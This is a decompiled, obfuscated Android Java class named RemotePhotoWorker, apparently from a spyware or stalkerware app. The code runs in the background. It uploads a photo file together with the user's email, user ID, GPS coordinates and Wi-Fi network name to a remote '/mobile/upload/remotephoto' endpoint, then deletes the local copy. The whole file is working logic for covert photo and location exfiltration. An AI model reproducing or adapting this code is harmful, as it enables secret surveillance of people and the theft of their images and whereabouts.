package com.zgoicsifmc.tasks;

import android.content.Context;
import android.util.ArrayMap;
import androidx.work.ListenableWorker;
import androidx.work.Worker;
import androidx.work.WorkerParameters;
import java.io.File;
import org.json.JSONObject;

public class RemotePhotoWorker extends Worker {
    public RemotePhotoWorker(Context context, WorkerParameters workerParameters) {
        super(context, workerParameters);
    }

    public ListenableWorker.a o() {
        File file;
        j42 a;
        Context a2 = a();
        String j = f().j("filePath");
        xt1 xt1 = new xt1(a2);
        ArrayMap arrayMap = new ArrayMap();
        ArrayMap arrayMap2 = new ArrayMap();
        try {
            file = new File(j);
            if (file.exists()) {
                arrayMap2.put("file", file);
                arrayMap.put("email", xt1.c("email", ""));
                arrayMap.put("uid", xt1.c("uid", ""));
                arrayMap.put("filename", file.getName());
                arrayMap.put("datetime", ox1.c(file.lastModified()));
                arrayMap.put("latitude", String.valueOf(xt1.g()));
                arrayMap.put("longitude", String.valueOf(xt1.k()));
                arrayMap.put("wifi_ssid", xt1.c("wifi_ssid", ""));
                o82.d(arrayMap.toString(), new Object[0]);
                String e = xt1.e("/mobile/upload/remotephoto");
                o82.d(e, new Object[0]);
                a = vt1.a().e(e, arrayMap, arrayMap2).E().a();
                o82.d(new JSONObject(a.w()).toString(), new Object[0]);
                a.close();
                if (file.delete()) {
                    o82.d("Cached Photo %s Deleted", file.getAbsolutePath());
                }
            }
        } catch (Exception e2) {
            qg1.a().c(e2);
            e2.printStackTrace();
        } catch (Throwable th) {
            if (a != null) {
                a.close();
            }
            if (file.delete()) {
                o82.d("Cached Photo %s Deleted", file.getAbsolutePath());
            }
            throw th;
        }
        return ListenableWorker.a.c();
    }
}
